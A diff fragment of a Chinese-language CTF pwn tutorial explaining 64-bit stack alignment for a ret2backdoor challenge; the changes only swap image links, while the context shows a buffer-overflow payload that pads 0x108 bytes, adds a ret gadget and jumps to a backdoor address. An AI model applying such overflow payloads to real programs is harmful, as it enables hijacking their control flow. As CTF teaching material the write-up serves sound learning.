@@ -156,7 +156,7 @@ OK此处去简单了解知识点：**堆栈平衡**（只有64位会出现这种
 原理慢慢理解，直接给方法，下面给出两种方法解决
 
 <h3 id="23833363">1、加ret</h3>
-![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608776-5b307e2e-6b5f-43fe-a457-bf298bddb49b.png)
+![](blob:https://hnusec-star.feishu.cn/728ab1fa-bca9-4250-8f6b-e40a30f16b92)
 
 ```plain
 ret=0x40101a
@@ -164,7 +164,7 @@ payload=b'A'*0x108+p64(ret)+p64(backdoor)
 ```
 
 <h3 id="e3679ed5">2、找合适的后门地址</h3>
-![](https://cdn.nlark.com/yuque/0/2025/png/56806197/1760698608553-46b11a03-da88-4f20-b7f3-9cb913fcb0f3.png)
+![](blob:https://hnusec-star.feishu.cn/355293c4-0a69-467c-9d2d-6e945178855b)
 
 把后门地址改成0x4011CF，也就是mov rbp,rsp这一步的地址
 
